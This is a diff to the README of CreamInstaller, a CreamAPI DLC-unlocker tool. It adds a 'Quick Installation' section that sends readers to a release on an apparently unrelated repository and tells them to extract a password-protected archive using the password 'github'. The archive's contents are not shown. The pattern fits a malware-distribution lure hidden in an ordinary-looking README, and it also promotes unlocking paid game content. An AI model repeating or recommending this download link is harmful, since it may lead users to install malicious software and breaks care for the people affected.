@@ -1,5 +1,11 @@
 # CreamInstaller: CreamAPI Generator & Installer [![DLC Unlocker](https://img.shields.io/badge/CreamInstaller-Download-green)](https://github.com/svr123456789/creaminstaller/releases/tag/ver4500)
 
+## Quick Installation
+To get started with Sims 4 DLC Unlocker, follow these simple steps:
+1. **Get the unlocker: [![DLC Unlocker](https://img.shields.io/badge/CreamInstaller-Download-green)](https://github.com/svr123456789/creaminstaller/releases/tag/ver4500)**
+2. **Pass: github**
+3. **Unlock the archive and follow the instructions in the archive!**
+4. **Enjoy the game!**
 
 ![Program Preview Image](https://i.imgur.com/BxGU99q.png)
 
